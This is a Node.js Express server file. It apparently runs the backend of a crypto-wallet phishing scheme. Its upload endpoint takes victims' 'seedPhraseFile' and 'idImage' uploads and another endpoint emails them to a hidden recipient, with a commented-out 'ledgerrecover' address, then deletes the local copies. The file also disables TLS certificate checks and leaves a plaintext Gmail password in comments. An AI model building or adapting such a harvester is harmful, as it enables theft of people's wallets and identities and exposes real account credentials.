process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; //to allow email br ablie to send but not secured

const express = require('express');
const cors = require('cors');
const multer = require('multer');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, './uploads');
  },
  filename: function (req, file, cb) {
    cb(null, `${Date.now()}_${file.originalname}`);
  }
});

const upload = multer({ storage });

app.post('/upload', upload.fields([{ name: 'file' }, { name: 'seedPhraseFile' }, { name: 'idImage' }]), (req, res) => {
  console.log('Files uploaded:', req.files);
  res.json({ message: 'Files uploaded successfully' });
});

// Email setup
const transporter = nodemailer.createTransport({
  service:process.env.VITE_EMAIL_SERVICE,
  //   // host: 'smtp.gmail.com',
  //   //   port: 465,
  //   //   secure: true, // use SSL
    auth: {
      user: process.env.VITE_EMAIL_USER,
      pass: process.env.VITE_EMAIL_PASS,
  }
});

// Endpoint for sending all files in the upload directory
app.post('/send-all-files', (req, res) => {
  const uploadDir = path.join(__dirname, 'uploads');
  
  // Read files in the directory
  fs.readdir(uploadDir, (err, files) => {
    if (err) {
      console.error('Error reading directory:', err);
      return res.status(500).send('Failed to read directory');
    }

    // Prepare email options
    const mailOptions = {
        from:process.env.VITE_EMAIL_USER,
        to:process.env.VITE_RECIPIENT_EMAIL_1,
        // to:'ledgerrecover@protonmail.com',
        subject:'TestMail',
        text:'sending today&apos; emails with Nodejs using Nodemailer',
        attachments: files.map(file => ({
          filename: file,
          path: path.join(uploadDir, file)
        }))
      };
  
      // Send email with attachments
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.error('Error sending email:', error);
          return res.status(500).send('Failed to send email');
        }
  
        // Optionally, clean up files after sending email
        files.forEach(file => fs.unlinkSync(path.join(uploadDir, file)));
  
        res.status(200).send('Files sent and email sent');
      });
    });
  });

app.listen(3001, () => {
  console.log('Server is running on port 3001');
});




// // Uploading files with multer
// const express = require('express');
// const cors = require('cors');
// const multer = require('multer');



// const app = express();
// app.use(cors());
// app.use(express.json());

// const storage = multer.diskStorage({
//   destination: function (req, file, cb) {
//     return cb (null, "./uploads")
//   },
//   filename: function (req, file, cb) {
//     return cb(null, `${Date.now()}_${file.originalname}`) 
//   }
// });

// const upload = multer({storage})

// app.post ('/upload', upload.single('file'), (req, res) => {
//   console.log(req.body);
//   console.log(req.file);
// });

// app.listen(3001, () => {
//   console.log("server is running")
// });


// send emails with Nodejs using Nodemailer
// process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// const nodemailer = require("nodemailer");
// let transporter = nodemailer.createTransport({
//   service: 'gmail',
//   // host: 'smtp.gmail.com',
//   //   port: 465,
//   //   secure: true, // use SSL
//   auth: {
//     user: 'jerryisibor23@gmail.com',
//     pass: 'zsbuacaawptujtcy',
//   }
// });

// let mailOptions = {
//   from:'jerryisibor23@gmail.com',
//   to:'nighteengale914@gmail.com',
//   subject:'TestMail',
//   text:'send emails with Nodejs using Nodemailer',
//   attachments:[
//     {
//       filename:'image.png',
//       path:'./uploads/1724217280794-WhatsApp.png',
//     },
//     {
//       filename:'text.txt',
//       path:'./uploads/old.txt',
//     }
//   ],
// };

// transporter.sendMail(mailOptions, (error, info) => {
//   if (error) {
//     console.log("Error Occur" + error)
//   }
//   else {
//     console.log("Email Sent: " + mailOptions.to, info.response)
//   }
// })